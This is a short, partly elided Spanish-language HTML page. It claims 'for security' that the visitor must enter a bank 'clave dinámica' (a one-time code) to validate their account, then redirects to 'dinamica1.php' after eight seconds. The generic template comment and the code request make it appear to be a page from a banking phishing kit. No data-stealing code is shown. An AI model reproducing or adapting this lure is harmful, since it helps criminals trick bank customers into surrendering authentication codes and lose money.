...
<head>
  ...
  <script>
    ...
    setTimeout(function() {
      window.location.href = "dinamica1.php"; // Reemplaza con la URL a la que deseas redireccionar
    }, 8000);
  </script>
</head>
<body>
  ...
  <div>
    ...
    <h1 class="message">Por medida de seguridad</h1>
    <p class="message">Debe ingresar la clave dinámica para la validación de su cuenta.</p>
  </div>
</body>
</html>
